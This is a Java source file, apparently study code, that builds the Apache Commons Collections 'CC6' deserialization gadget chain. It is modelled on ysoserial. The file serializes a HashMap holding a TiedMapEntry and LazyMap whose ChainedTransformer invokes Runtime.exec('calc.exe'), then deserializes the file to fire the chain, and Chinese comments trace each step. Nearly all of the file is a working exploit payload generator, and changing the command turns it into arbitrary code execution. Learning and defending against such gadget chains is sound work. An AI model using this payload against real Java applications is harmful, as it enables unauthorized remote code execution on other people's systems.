package run.ergou.deserialize.ysoserial;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC6 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[]{}}
                ),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[]{}}
                ),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"}
                )
        };

        Transformer[] tmpTransformer = new Transformer[] {new ConstantTransformer(1)};
        ChainedTransformer chainedTransformer = new ChainedTransformer(tmpTransformer);
        HashMap map = new HashMap();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "key");

        Map map1 = new HashMap();
        // HashMap.put() -> HashMap.hash() ... -> transform()会导致利用链被执行
        map1.put(tiedMapEntry, "value");
        // LazyMap.get()方法 if (map.containsKey(key) == false) { Object value = factory.transform(key);}
        lazyMap.remove("key");

        Field iTransformers = ChainedTransformer.class.getDeclaredField("iTransformers");
        iTransformers.setAccessible(true);
        iTransformers.set(chainedTransformer, transformers);

        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6"));
        oos.writeObject(map1);
        oos.close();

        // 利用链
        // ObjectInputStream#readObject() -> HashMap.readObject(ObjectInputStream in) ->
        // HashMap.hash(key/*tiedMapEntry*/) -> TiedMapEntry.hashCode() ->
        // TiedMapEntry.getValue() -> lazyMap.get("key") -> transform()
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc6"));
        ois.readObject();
        ois.close();
    }
}
